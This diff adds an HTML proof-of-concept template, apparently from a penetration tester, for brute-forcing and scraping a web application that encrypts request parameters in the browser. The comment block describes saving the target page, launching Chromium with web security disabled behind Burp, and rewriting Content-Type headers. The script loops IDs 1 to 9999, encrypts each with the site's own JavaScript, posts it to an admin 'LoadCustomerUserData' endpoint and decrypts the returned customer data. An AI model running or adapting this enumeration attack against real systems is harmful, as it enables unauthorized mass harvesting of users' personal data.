@@ -1,0 +1,84 @@
+<!--
+## Description ##
+* In case you want to scrape/bruteforce a website that encodes or encrypts the data/parameters on your browser first before sending to the server.
+* This is a simple PoC or template
+
+## How to run ##
+* The webpages to be downloaded needs to be the webpage that has the form requesting the data. The submitted data if intercepted via Burp should be seen to produce the JavaScript encrypted data. Yes that webpage! Save that webpage "complete" (CTRL + S)
+  * After saving the webpage offline, you can edit/trim all the unnecessary bits
+* Open in Chromium: `chromium --disable-web-security --user-data-dir="/home/kali/chromium" --incognito --proxy-server=http://127.0.0.1:8080`
+    * This is to turn the CORS issue off.
+      * The proper way of doing this is to make a proxy such as via Node.js server. This webpage will be requesting to that Node.js proxy. The node.js webapp would then be requesting to the actual target server.
+        * Tried this already and it does in fact solve the CORS issue + the "Match Replace" requirement in Burp below, however that is it. You would still need to run this script since you cannot really port or directly use the downloaded JavaScript files you downloaded into Node.js.
+* Burp needs to have "Match Replace" condition for "Request Header"
+    * Match: ^Content-Type: text/plain$
+    * Replace: Content-Type: application/json
+* Adjust sleep time (await sleep()) below and the value in the "for loop" for the "id" number
+-->
+
+<html>
+<head>
+<script src="Web_Application_files/app.js"></script>
+<script src="Web_Application_files/crypto-js.js"></script>
+<script src="Web_Application_files/aes.js"></script>
+<script src="Web_Application_files/MasterOperationalScript.js">
+<script src="Web_Application_files/AdminOperationStuff.js"></script>
+</head>
+<body>
+
+<div class="retrieverDIV">
+    <input type="button" id="buttoned" onclick="myFunction()" text="hi" value="Click me to start scraping">
+    <br/>
+    <div id="output"/></div>
+</div>
+
+<script>
+    //Stackoverflow source: https://stackoverflow.com/a/39914235
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function myFunction() {
+      for (let id = 1; id < 9999; id++) {
+          var encrypted = encrypt(zeroFill(id,4).toString());
+  
+  
+          var url = "https://app.domain.com/AdminOperationsMaintenance.asmx/LoadCustomerUserData";
+          var burp0_headers = {"Content-Type": "text/plain",};                          
+          var burp0_bodyString = "{UserId:'" + encrypted + "'}";
+  
+          fetch("https://app.domain.com/AdminOperationsMaintenance.asmx/LoadCustomerUserData",{
+          method: 'POST',
+          headers: burp0_headers,
+          body: burp0_bodyString,
+          }).then(resp => resp.json())
+          .then(json => appendData(json));
+
+          function appendData(json) {
+          var mainContainer = document.getElementById("output");
+          var obj = JSON.parse(JSON.stringify(json));
+          mainContainer.innerHTML += zeroFill(id,4) +": ";
+          mainContainer.innerHTML += decrypt(obj.returnData);
+          mainContainer.innerHTML += "</br>";
+          }
+
+          await sleep(350);
+      }
+    }
+    
+
+    // Padding zeroes in front. Got this from Stackoverflow
+    // Source: https://stackoverflow.com/a/1267338
+    function zeroFill( number, width )
+    {
+    width -= number.toString().length;
+    if ( width > 0 )
+    {
+        return new Array( width + (/\./.test( number ) ? 2 : 1) ).join( '0' ) + number;
+    }
+    return number + ""; // always return a string
+    }
+
+</script>
+</body>
+</html>
